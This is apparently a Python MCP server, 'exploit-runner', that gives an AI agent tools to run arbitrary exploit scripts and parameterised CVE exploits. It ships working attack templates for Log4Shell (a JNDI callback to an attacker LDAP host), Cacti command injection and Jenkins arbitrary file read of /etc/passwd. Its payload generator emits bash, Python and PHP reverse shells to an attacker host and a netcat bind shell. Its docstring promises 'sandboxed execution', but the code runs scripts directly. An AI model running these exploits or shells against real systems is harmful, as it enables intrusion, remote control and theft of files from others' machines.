#!/usr/bin/env python3
"""
OpenSploit MCP Server: exploit-runner

Execute CVE exploits and PoCs from searchsploit, GitHub, or custom scripts.
Provides sandboxed execution with output capture.

Also supports parameterized exploit templates for common CVEs that the agent
can execute by providing target-specific parameters.
"""

import asyncio
import base64
import json
import os
import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from string import Template
from typing import Any, Dict, List, Optional

import yaml

from mcp_common import BaseMCPServer, ToolResult, ToolError

# Workspace for exploit files
EXPLOIT_DIR = Path("/tmp/exploits")
TEMPLATE_DIR = Path(os.environ.get("TEMPLATE_DIR", "/app/templates"))


@dataclass
class ExploitParameter:
    """Parameter definition for an exploit template."""
    name: str
    description: str
    required: bool = True
    default: Optional[str] = None
    param_type: str = "string"
    example: Optional[str] = None


@dataclass
class ExploitTemplate:
    """Loaded exploit template."""
    id: str
    name: str
    cve: Optional[str]
    description: str
    severity: str
    affected_software: List[str]
    affected_versions: List[str]
    exploit_type: str  # curl, bash, python, metasploit
    parameters: List[ExploitParameter]
    script_content: Optional[str] = None
    curl_template: Optional[str] = None
    metasploit_module: Optional[str] = None
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    author: Optional[str] = None
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    payload_types: List[str] = field(default_factory=list)


class ExploitRunnerServer(BaseMCPServer):
    """MCP server for running exploits and templates."""

    def __init__(self):
        super().__init__(
            name="exploit-runner",
            description="Execute CVE exploits, PoCs, and parameterized templates",
            version="1.1.0",
        )

        # Ensure directories exist
        EXPLOIT_DIR.mkdir(parents=True, exist_ok=True)
        TEMPLATE_DIR.mkdir(parents=True, exist_ok=True)

        # Load exploit templates
        self.templates: Dict[str, ExploitTemplate] = {}
        self._load_templates()

        self.register_method(
            name="run_python",
            description="Execute a Python exploit script",
            params={
                "script": {
                    "type": "string",
                    "required": True,
                    "description": "Python script content or path",
                },
                "args": {
                    "type": "array",
                    "description": "Command line arguments for the script",
                },
                "is_path": {
                    "type": "boolean",
                    "default": False,
                    "description": "Whether script is a file path (vs content)",
                },
                "is_base64": {
                    "type": "boolean",
                    "default": False,
                    "description": "Whether script content is base64 encoded",
                },
                "python_version": {
                    "type": "enum",
                    "values": ["python3", "python2"],
                    "default": "python3",
                    "description": "Python version to use",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Execution timeout in seconds",
                },
                "env": {
                    "type": "object",
                    "description": "Environment variables to set",
                },
            },
            handler=self.run_python,
        )

        self.register_method(
            name="run_shell",
            description="Execute a shell script or command",
            params={
                "script": {
                    "type": "string",
                    "required": True,
                    "description": "Shell script content or command",
                },
                "args": {
                    "type": "array",
                    "description": "Command line arguments",
                },
                "shell": {
                    "type": "enum",
                    "values": ["bash", "sh", "zsh"],
                    "default": "bash",
                    "description": "Shell to use",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Execution timeout",
                },
                "env": {
                    "type": "object",
                    "description": "Environment variables",
                },
            },
            handler=self.run_shell,
        )

        self.register_method(
            name="run_ruby",
            description="Execute a Ruby exploit script",
            params={
                "script": {
                    "type": "string",
                    "required": True,
                    "description": "Ruby script content or path",
                },
                "args": {
                    "type": "array",
                    "description": "Command line arguments",
                },
                "is_path": {
                    "type": "boolean",
                    "default": False,
                    "description": "Whether script is a file path",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Execution timeout",
                },
                "env": {
                    "type": "object",
                    "description": "Environment variables to set",
                },
            },
            handler=self.run_ruby,
        )

        self.register_method(
            name="prepare_exploit",
            description="Prepare exploit by downloading and setting up dependencies",
            params={
                "content": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit script content (or base64)",
                },
                "filename": {
                    "type": "string",
                    "required": True,
                    "description": "Filename to save as",
                },
                "is_base64": {
                    "type": "boolean",
                    "default": False,
                    "description": "Whether content is base64 encoded",
                },
                "requirements": {
                    "type": "array",
                    "description": "Python packages to install",
                },
            },
            handler=self.prepare_exploit,
        )

        self.register_method(
            name="list_exploits",
            description="List prepared exploits in workspace",
            params={},
            handler=self.list_exploits,
        )

        self.register_method(
            name="analyze_exploit",
            description="Analyze an exploit script for safety and requirements",
            params={
                "script": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit script content",
                },
                "language": {
                    "type": "enum",
                    "values": ["python", "ruby", "shell", "auto"],
                    "default": "auto",
                    "description": "Script language",
                },
            },
            handler=self.analyze_exploit,
        )

    async def _run_process(
        self,
        cmd: List[str],
        timeout: int = 120,
        env: Optional[Dict[str, str]] = None,
        cwd: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Run a subprocess with timeout."""
        process_env = os.environ.copy()
        if env:
            process_env.update(env)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=process_env,
                cwd=cwd,
            )

            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=timeout,
            )

            return {
                "returncode": proc.returncode,
                "stdout": stdout.decode('utf-8', errors='replace'),
                "stderr": stderr.decode('utf-8', errors='replace'),
                "success": proc.returncode == 0,
            }

        except asyncio.TimeoutError:
            proc.kill()
            return {
                "returncode": -1,
                "stdout": "",
                "stderr": f"Process timed out after {timeout} seconds",
                "success": False,
                "timeout": True,
            }
        except Exception as e:
            return {
                "returncode": -1,
                "stdout": "",
                "stderr": str(e),
                "success": False,
                "error": str(e),
            }

    async def run_python(
        self,
        script: str,
        args: Optional[List[str]] = None,
        is_path: bool = False,
        is_base64: bool = False,
        python_version: str = "python3",
        timeout: int = 120,
        env: Optional[Dict[str, str]] = None,
    ) -> ToolResult:
        """Run a Python exploit script."""
        self.logger.info("Running Python exploit")

        script_path = None
        temp_file = None

        try:
            if is_path:
                script_path = script
            else:
                # Decode if base64
                if is_base64:
                    try:
                        script_content = base64.b64decode(script).decode('utf-8')
                    except Exception as e:
                        return ToolResult(
                            success=False, data={},
                            error=f"Invalid base64 content: {e}",
                        )
                else:
                    script_content = script

                # Write to temp file
                temp_file = tempfile.NamedTemporaryFile(
                    mode='w',
                    suffix='.py',
                    dir=str(EXPLOIT_DIR),
                    delete=False,
                )
                temp_file.write(script_content)
                temp_file.close()
                script_path = temp_file.name

            # Build command
            cmd = [python_version, script_path]
            if args:
                cmd.extend(args)

            result = await self._run_process(cmd, timeout, env)

            return ToolResult(
                success=result["success"],
                data={
                    "returncode": result["returncode"],
                    "stdout": result["stdout"][:50000],
                    "stderr": result["stderr"][:10000],
                    "command": " ".join(cmd),
                    "timeout": result.get("timeout", False),
                },
                raw_output=result["stdout"][:10000] if result["success"] else result["stderr"][:5000],
                error=result["stderr"][:1000] if not result["success"] else None,
            )

        finally:
            if temp_file and os.path.exists(temp_file.name):
                os.unlink(temp_file.name)

    async def run_shell(
        self,
        script: str,
        args: Optional[List[str]] = None,
        shell: str = "bash",
        timeout: int = 120,
        env: Optional[Dict[str, str]] = None,
    ) -> ToolResult:
        """Run a shell script."""
        self.logger.info("Running shell exploit")

        temp_file = None

        try:
            # Write script to temp file
            temp_file = tempfile.NamedTemporaryFile(
                mode='w',
                suffix='.sh',
                dir=str(EXPLOIT_DIR),
                delete=False,
            )
            temp_file.write(script)
            temp_file.close()

            # Make executable
            os.chmod(temp_file.name, 0o755)

            # Build command
            cmd = [shell, temp_file.name]
            if args:
                cmd.extend(args)

            result = await self._run_process(cmd, timeout, env)

            return ToolResult(
                success=result["success"],
                data={
                    "returncode": result["returncode"],
                    "stdout": result["stdout"][:50000],
                    "stderr": result["stderr"][:10000],
                    "command": " ".join(cmd),
                },
                raw_output=result["stdout"][:10000] if result["success"] else result["stderr"][:5000],
                error=result["stderr"][:1000] if not result["success"] else None,
            )

        finally:
            if temp_file and os.path.exists(temp_file.name):
                os.unlink(temp_file.name)

    async def run_ruby(
        self,
        script: str,
        args: Optional[List[str]] = None,
        is_path: bool = False,
        timeout: int = 120,
        env: Optional[Dict[str, str]] = None,
    ) -> ToolResult:
        """Run a Ruby exploit script."""
        self.logger.info("Running Ruby exploit")

        script_path = None
        temp_file = None

        try:
            if is_path:
                script_path = script
            else:
                temp_file = tempfile.NamedTemporaryFile(
                    mode='w',
                    suffix='.rb',
                    dir=str(EXPLOIT_DIR),
                    delete=False,
                )
                temp_file.write(script)
                temp_file.close()
                script_path = temp_file.name

            cmd = ["ruby", script_path]
            if args:
                cmd.extend(args)

            result = await self._run_process(cmd, timeout, env)

            return ToolResult(
                success=result["success"],
                data={
                    "returncode": result["returncode"],
                    "stdout": result["stdout"][:50000],
                    "stderr": result["stderr"][:10000],
                    "command": " ".join(cmd),
                },
                raw_output=result["stdout"][:10000] if result["success"] else result["stderr"][:5000],
                error=result["stderr"][:1000] if not result["success"] else None,
            )

        finally:
            if temp_file and os.path.exists(temp_file.name):
                os.unlink(temp_file.name)

    async def prepare_exploit(
        self,
        content: str,
        filename: str,
        is_base64: bool = False,
        requirements: Optional[List[str]] = None,
    ) -> ToolResult:
        """Prepare an exploit for execution."""
        self.logger.info(f"Preparing exploit: {filename}")

        try:
            # Validate filename (prevent path traversal)
            if '/' in filename or '\\' in filename or '..' in filename:
                return ToolResult(
                    success=False, data={},
                    error=f"Invalid filename: must not contain path separators or '..'",
                )

            # Decode content
            if is_base64:
                try:
                    file_content = base64.b64decode(content)
                except Exception as e:
                    return ToolResult(
                        success=False, data={},
                        error=f"Invalid base64 content: {e}",
                    )
            else:
                file_content = content.encode('utf-8')

            # Save to exploit directory
            exploit_path = EXPLOIT_DIR / filename
            with open(exploit_path, 'wb') as f:
                f.write(file_content)

            # Make executable
            os.chmod(exploit_path, 0o755)

            # Install requirements if specified
            installed = []
            if requirements:
                for req in requirements:
                    result = await self._run_process(
                        ["pip3", "install", "--quiet", req],
                        timeout=60,
                    )
                    if result["success"]:
                        installed.append(req)

            return ToolResult(
                success=True,
                data={
                    "path": str(exploit_path),
                    "filename": filename,
                    "size_bytes": len(file_content),
                    "requirements_installed": installed,
                },
                raw_output=f"Prepared exploit at {exploit_path}",
            )

        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def list_exploits(self) -> ToolResult:
        """List prepared exploits."""
        exploits = []

        if EXPLOIT_DIR.exists():
            for f in EXPLOIT_DIR.iterdir():
                if f.is_file():
                    exploits.append({
                        "name": f.name,
                        "path": str(f),
                        "size_bytes": f.stat().st_size,
                        "modified": f.stat().st_mtime,
                    })

        return ToolResult(
            success=True,
            data={
                "exploits": exploits,
                "count": len(exploits),
                "directory": str(EXPLOIT_DIR),
            },
            raw_output=f"Found {len(exploits)} prepared exploits",
        )

    async def analyze_exploit(
        self,
        script: str,
        language: str = "auto",
    ) -> ToolResult:
        """Analyze exploit script for safety and requirements."""
        self.logger.info("Analyzing exploit script")

        # Detect language
        if language == "auto":
            if script.strip().startswith("#!/usr/bin/env python") or "import " in script:
                language = "python"
            elif script.strip().startswith("#!/usr/bin/env ruby") or "require " in script:
                language = "ruby"
            else:
                language = "shell"

        analysis = {
            "language": language,
            "lines": len(script.split('\n')),
            "imports": [],
            "dangerous_patterns": [],
            "network_operations": [],
            "file_operations": [],
            "command_execution": [],
        }

        # Python analysis
        if language == "python":
            # Find imports
            imports = re.findall(r'^(?:import|from)\s+(\w+)', script, re.MULTILINE)
            analysis["imports"] = list(set(imports))

            # Check for dangerous patterns
            dangerous = []
            if "eval(" in script:
                dangerous.append("eval() usage")
            if "exec(" in script:
                dangerous.append("exec() usage")
            if "subprocess" in script:
                dangerous.append("subprocess calls")
            if "os.system" in script:
                dangerous.append("os.system calls")
            if "__import__" in script:
                dangerous.append("dynamic imports")
            analysis["dangerous_patterns"] = dangerous

            # Network operations
            if any(x in script for x in ["socket", "requests", "urllib", "http.client"]):
                analysis["network_operations"].append("network library usage")
            if "connect(" in script:
                analysis["network_operations"].append("socket connections")

            # File operations
            if "open(" in script:
                analysis["file_operations"].append("file I/O")
            if any(x in script for x in ["os.remove", "shutil", "os.unlink"]):
                analysis["file_operations"].append("file deletion")

        # Shell analysis
        elif language == "shell":
            if "curl " in script or "wget " in script:
                analysis["network_operations"].append("HTTP requests")
            if "nc " in script or "netcat" in script:
                analysis["network_operations"].append("netcat usage")
            if "rm -rf" in script:
                analysis["dangerous_patterns"].append("recursive file deletion")
            if "> /dev/" in script:
                analysis["dangerous_patterns"].append("device file writes")

        # Estimate requirements
        if language == "python":
            common_deps = {
                "requests": "requests",
                "pwntools": "pwntools",
                "paramiko": "paramiko",
                "impacket": "impacket",
                "scapy": "scapy",
                "cryptography": "cryptography",
                "pycryptodome": "pycryptodome",
            }
            requirements = []
            for imp, pkg in common_deps.items():
                if imp in analysis["imports"]:
                    requirements.append(pkg)
            analysis["likely_requirements"] = requirements

        return ToolResult(
            success=True,
            data=analysis,
            raw_output=f"Analyzed {language} script ({analysis['lines']} lines)",
        )

    # =========================================================================
    # Template-based exploit methods
    # =========================================================================

    def _load_templates(self):
        """Load exploit templates from YAML files."""
        if not TEMPLATE_DIR.exists():
            self.logger.warning(f"Template directory not found: {TEMPLATE_DIR}")
            self._create_example_templates()
            return

        for yaml_file in TEMPLATE_DIR.glob("*.yaml"):
            try:
                with open(yaml_file) as f:
                    data = yaml.safe_load(f)

                if not data:
                    continue

                # Handle multiple templates per file
                templates = data if isinstance(data, list) else [data]

                for tmpl_data in templates:
                    template = self._parse_template(tmpl_data)
                    if template:
                        self.templates[template.id] = template
                        self.logger.info(f"Loaded template: {template.id}")

            except Exception as e:
                self.logger.error(f"Failed to load {yaml_file}: {e}")

        self.logger.info(f"Loaded {len(self.templates)} exploit templates")

        # Create examples if no templates found
        if not self.templates:
            self._create_example_templates()

    def _parse_template(self, data: dict) -> Optional[ExploitTemplate]:
        """Parse template data into ExploitTemplate object."""
        try:
            params = []
            for p in data.get("parameters", []):
                params.append(ExploitParameter(
                    name=p["name"],
                    description=p.get("description", ""),
                    required=p.get("required", True),
                    default=p.get("default"),
                    param_type=p.get("type", "string"),
                    example=p.get("example"),
                ))

            return ExploitTemplate(
                id=data["id"],
                name=data["name"],
                cve=data.get("cve"),
                description=data.get("description", ""),
                severity=data.get("severity", "medium"),
                affected_software=data.get("affected_software", []),
                affected_versions=data.get("affected_versions", []),
                exploit_type=data.get("exploit_type", "bash"),
                parameters=params,
                script_content=data.get("script_content"),
                curl_template=data.get("curl_template"),
                metasploit_module=data.get("metasploit_module"),
                success_indicators=data.get("success_indicators", []),
                failure_indicators=data.get("failure_indicators", []),
                author=data.get("author"),
                references=data.get("references", []),
                tags=data.get("tags", []),
                payload_types=data.get("payload_types", []),
            )
        except Exception as e:
            self.logger.error(f"Failed to parse template: {e}")
            return None

    def _create_example_templates(self):
        """Create example exploit templates."""
        examples = [
            {
                "id": "log4shell",
                "name": "Log4j RCE (Log4Shell)",
                "cve": "CVE-2021-44228",
                "description": "Remote code execution via JNDI injection in Log4j",
                "severity": "critical",
                "affected_software": ["log4j", "java"],
                "affected_versions": ["2.0-beta9 to 2.14.1"],
                "exploit_type": "curl",
                "parameters": [
                    {"name": "target_url", "type": "string", "required": True, "description": "Target URL"},
                    {"name": "header", "type": "string", "default": "X-Api-Version", "description": "Header to inject"},
                    {"name": "callback_host", "type": "string", "required": True, "description": "LDAP callback host"},
                    {"name": "callback_port", "type": "integer", "default": 1389, "description": "Callback port"},
                ],
                "curl_template": "curl -s -H '${header}: ${jndi:ldap://${callback_host}:${callback_port}/a}' '${target_url}'",
                "success_indicators": ["callback received"],
                "tags": ["rce", "java", "log4j", "critical"],
            },
            {
                "id": "cacti-cmd-injection",
                "name": "Cacti Command Injection",
                "cve": "CVE-2022-46169",
                "description": "Pre-auth command injection in Cacti monitoring",
                "severity": "critical",
                "affected_software": ["cacti"],
                "affected_versions": ["<1.2.23"],
                "exploit_type": "curl",
                "parameters": [
                    {"name": "target_url", "type": "string", "required": True, "description": "Cacti URL"},
                    {"name": "host_id", "type": "integer", "default": 1, "description": "Host ID"},
                    {"name": "command", "type": "string", "required": True, "description": "Command to execute"},
                ],
                "curl_template": 'curl -sk "${target_url}/remote_agent.php" -G -H "X-Forwarded-For: 127.0.0.1" --data-urlencode "action=polldata" --data-urlencode "host_id=${host_id}" --data-urlencode "local_data_ids[0]=1" --data-urlencode "poller_id=;${command}"',
                "success_indicators": ["uid=", "root", "www-data"],
                "tags": ["rce", "cacti", "command_injection"],
            },
            {
                "id": "jenkins-file-read",
                "name": "Jenkins Arbitrary File Read",
                "cve": "CVE-2024-23897",
                "description": "Arbitrary file read via CLI argument parsing",
                "severity": "critical",
                "affected_software": ["jenkins"],
                "affected_versions": ["<2.441", "<2.426.3 LTS"],
                "exploit_type": "bash",
                "parameters": [
                    {"name": "target_url", "type": "string", "required": True, "description": "Jenkins URL"},
                    {"name": "file_path", "type": "string", "default": "/etc/passwd", "description": "File to read"},
                ],
                "script_content": '''#!/bin/bash
TARGET="${target_url}"
FILE="${file_path}"
if [ ! -f /tmp/jenkins-cli.jar ]; then
    wget -q "$TARGET/jnlpJars/jenkins-cli.jar" -O /tmp/jenkins-cli.jar 2>/dev/null
fi
java -jar /tmp/jenkins-cli.jar -s "$TARGET" help "@$FILE" 2>&1 | grep -v "^ERROR:" | head -50
''',
                "success_indicators": ["root:", "bin:"],
                "failure_indicators": ["No such file", "Permission denied"],
                "tags": ["file_read", "jenkins"],
            },
        ]

        # Write example templates
        example_file = TEMPLATE_DIR / "examples.yaml"
        with open(example_file, "w") as f:
            yaml.dump(examples, f, default_flow_style=False)

        self.logger.info(f"Created example templates in {example_file}")

        # Load into memory
        for tmpl_data in examples:
            template = self._parse_template(tmpl_data)
            if template:
                self.templates[template.id] = template

    def _substitute_params(self, template_str: str, params: dict) -> str:
        """Substitute parameters in a template string."""
        result = template_str
        for key, value in params.items():
            result = result.replace(f"${{{key}}}", str(value))
            result = result.replace(f"${key}", str(value))
        return result

    async def list_templates(
        self,
        cve: Optional[str] = None,
        software: Optional[str] = None,
        severity: Optional[str] = None,
        tag: Optional[str] = None,
    ) -> ToolResult:
        """List available exploit templates."""
        results = []

        for tmpl in self.templates.values():
            if cve and tmpl.cve != cve:
                continue
            if software and software.lower() not in [s.lower() for s in tmpl.affected_software]:
                continue
            if severity and tmpl.severity != severity:
                continue
            if tag and tag.lower() not in [t.lower() for t in tmpl.tags]:
                continue

            results.append({
                "id": tmpl.id,
                "name": tmpl.name,
                "cve": tmpl.cve,
                "severity": tmpl.severity,
                "affected_software": tmpl.affected_software,
                "exploit_type": tmpl.exploit_type,
                "tags": tmpl.tags,
            })

        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        results.sort(key=lambda x: severity_order.get(x["severity"], 4))

        return ToolResult(
            success=True,
            data={"templates": results, "total": len(results)},
            raw_output=f"Found {len(results)} exploit templates",
        )

    async def get_template(self, template_id: str) -> ToolResult:
        """Get details of a specific exploit template."""
        if template_id not in self.templates:
            return ToolResult(
                success=False,
                data={"template_id": template_id},
                error=f"Template not found: {template_id}",
            )

        tmpl = self.templates[template_id]

        return ToolResult(
            success=True,
            data={
                "id": tmpl.id,
                "name": tmpl.name,
                "cve": tmpl.cve,
                "description": tmpl.description,
                "severity": tmpl.severity,
                "affected_software": tmpl.affected_software,
                "affected_versions": tmpl.affected_versions,
                "exploit_type": tmpl.exploit_type,
                "parameters": [
                    {
                        "name": p.name,
                        "description": p.description,
                        "required": p.required,
                        "default": p.default,
                        "type": p.param_type,
                        "example": p.example,
                    }
                    for p in tmpl.parameters
                ],
                "success_indicators": tmpl.success_indicators,
                "references": tmpl.references,
                "tags": tmpl.tags,
            },
            raw_output=f"{tmpl.name} ({tmpl.cve}): {tmpl.description}",
        )

    async def search_templates(
        self,
        software: str,
        version: Optional[str] = None,
    ) -> ToolResult:
        """Search for exploit templates matching software."""
        matches = []
        software_lower = software.lower()

        for tmpl in self.templates.values():
            if any(software_lower in s.lower() for s in tmpl.affected_software):
                matches.append({
                    "id": tmpl.id,
                    "name": tmpl.name,
                    "cve": tmpl.cve,
                    "severity": tmpl.severity,
                    "affected_versions": tmpl.affected_versions,
                    "description": tmpl.description,
                })

        return ToolResult(
            success=True,
            data={"software": software, "version": version, "matches": matches, "total": len(matches)},
            raw_output=f"Found {len(matches)} potential exploits for {software}",
        )

    async def run_template(
        self,
        template_id: str,
        params: dict,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute an exploit template with provided parameters."""
        if template_id not in self.templates:
            return ToolResult(
                success=False,
                data={"template_id": template_id},
                error=f"Template not found: {template_id}",
            )

        tmpl = self.templates[template_id]

        # Fill in defaults
        filled_params = {}
        for p in tmpl.parameters:
            if p.name in params:
                filled_params[p.name] = params[p.name]
            elif p.default is not None:
                filled_params[p.name] = p.default
            elif p.required:
                return ToolResult(
                    success=False,
                    data={"template_id": template_id, "missing_param": p.name},
                    error=f"Missing required parameter: {p.name}",
                )

        self.logger.info(f"Running template {template_id}")

        try:
            if tmpl.exploit_type == "curl":
                return await self._run_curl_template(tmpl, filled_params, timeout)
            elif tmpl.exploit_type == "bash":
                return await self._run_bash_template(tmpl, filled_params, timeout)
            elif tmpl.exploit_type == "python":
                return await self._run_python_template(tmpl, filled_params, timeout)
            else:
                return ToolResult(
                    success=False,
                    data={"template_id": template_id},
                    error=f"Unsupported exploit type: {tmpl.exploit_type}",
                )
        except Exception as e:
            return ToolResult(
                success=False,
                data={"template_id": template_id},
                error=str(e),
            )

    async def _run_curl_template(
        self,
        tmpl: ExploitTemplate,
        params: dict,
        timeout: int,
    ) -> ToolResult:
        """Run a curl-based template."""
        if not tmpl.curl_template:
            return ToolResult(success=False, error="No curl template defined")

        command = self._substitute_params(tmpl.curl_template, params)

        result = await self._run_process(["bash", "-c", command], timeout)
        output = result["stdout"]

        success = any(ind.lower() in output.lower() for ind in tmpl.success_indicators)
        failed = any(ind.lower() in output.lower() for ind in tmpl.failure_indicators)

        return ToolResult(
            success=success and not failed,
            data={
                "template_id": tmpl.id,
                "cve": tmpl.cve,
                "output": output,
                "stderr": result["stderr"] if result["stderr"] else None,
                "indicators_matched": [ind for ind in tmpl.success_indicators if ind.lower() in output.lower()],
            },
            raw_output=output,
        )

    async def _run_bash_template(
        self,
        tmpl: ExploitTemplate,
        params: dict,
        timeout: int,
    ) -> ToolResult:
        """Run a bash script template."""
        if not tmpl.script_content:
            return ToolResult(success=False, error="No script content defined")

        script = self._substitute_params(tmpl.script_content, params)

        # Write and execute
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
            f.write(script)
            script_path = f.name

        try:
            os.chmod(script_path, 0o755)
            result = await self._run_process(["bash", script_path], timeout)
            output = result["stdout"]

            success = any(ind.lower() in output.lower() for ind in tmpl.success_indicators)
            failed = any(ind.lower() in output.lower() for ind in tmpl.failure_indicators)

            return ToolResult(
                success=success and not failed,
                data={"template_id": tmpl.id, "cve": tmpl.cve, "output": output},
                raw_output=output,
            )
        finally:
            os.unlink(script_path)

    async def _run_python_template(
        self,
        tmpl: ExploitTemplate,
        params: dict,
        timeout: int,
    ) -> ToolResult:
        """Run a Python script template."""
        if not tmpl.script_content:
            return ToolResult(success=False, error="No script content defined")

        script = self._substitute_params(tmpl.script_content, params)

        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(script)
            script_path = f.name

        try:
            result = await self._run_process(["python3", script_path], timeout)
            output = result["stdout"]

            success = any(ind.lower() in output.lower() for ind in tmpl.success_indicators)
            failed = any(ind.lower() in output.lower() for ind in tmpl.failure_indicators)

            return ToolResult(
                success=success and not failed,
                data={"template_id": tmpl.id, "cve": tmpl.cve, "output": output},
                raw_output=output,
            )
        finally:
            os.unlink(script_path)

    async def generate_payload(
        self,
        payload_type: str,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        command: Optional[str] = None,
        language: str = "bash",
    ) -> ToolResult:
        """Generate a payload for use with exploits."""
        payloads = {
            "bash": {
                "reverse_shell": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" if lhost and lport else None,
                "bind_shell": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l {lport} >/tmp/f" if lport else None,
                "command": command,
            },
            "python": {
                "reverse_shell": f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' if lhost and lport else None,
                "command": f'python3 -c \'import os; os.system("{command}")\'' if command else None,
            },
            "php": {
                "reverse_shell": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'' if lhost and lport else None,
                "command": f"<?php system('{command}'); ?>" if command else None,
            },
        }

        if language not in payloads:
            return ToolResult(success=False, error=f"Unsupported language: {language}")

        lang_payloads = payloads[language]
        if payload_type not in lang_payloads or lang_payloads[payload_type] is None:
            return ToolResult(success=False, error=f"Cannot generate {payload_type} for {language} with given params")

        payload = lang_payloads[payload_type]
        b64_payload = base64.b64encode(payload.encode()).decode()

        return ToolResult(
            success=True,
            data={"payload_type": payload_type, "language": language, "payload": payload, "payload_base64": b64_payload},
            raw_output=payload,
        )


# Register template methods in __init__
_original_init = ExploitRunnerServer.__init__

def _patched_init(self):
    _original_init(self)

    # Template methods
    self.register_method(
        name="list_templates",
        description="List available exploit templates",
        params={
            "cve": {"type": "string", "description": "Filter by CVE ID"},
            "software": {"type": "string", "description": "Filter by affected software"},
            "severity": {"type": "string", "enum": ["critical", "high", "medium", "low"]},
            "tag": {"type": "string", "description": "Filter by tag"},
        },
        handler=self.list_templates,
    )

    self.register_method(
        name="get_template",
        description="Get details of a specific exploit template",
        params={
            "template_id": {"type": "string", "required": True, "description": "Template ID"},
        },
        handler=self.get_template,
    )

    self.register_method(
        name="search_templates",
        description="Search for exploit templates by software/version",
        params={
            "software": {"type": "string", "required": True, "description": "Software name"},
            "version": {"type": "string", "description": "Version string"},
        },
        handler=self.search_templates,
    )

    self.register_method(
        name="run_template",
        description="Execute an exploit template with parameters",
        params={
            "template_id": {"type": "string", "required": True, "description": "Template ID"},
            "params": {"type": "object", "required": True, "description": "Exploit parameters"},
            "timeout": {"type": "integer", "default": 120, "description": "Timeout"},
        },
        handler=self.run_template,
    )

    self.register_method(
        name="generate_payload",
        description="Generate a payload for use with exploits",
        params={
            "payload_type": {"type": "string", "required": True, "enum": ["reverse_shell", "bind_shell", "command"]},
            "lhost": {"type": "string", "description": "Attacker IP"},
            "lport": {"type": "integer", "description": "Attacker port"},
            "command": {"type": "string", "description": "Command for command payloads"},
            "language": {"type": "string", "default": "bash", "enum": ["bash", "python", "php"]},
        },
        handler=self.generate_payload,
    )

ExploitRunnerServer.__init__ = _patched_init


if __name__ == "__main__":
    ExploitRunnerServer.main()
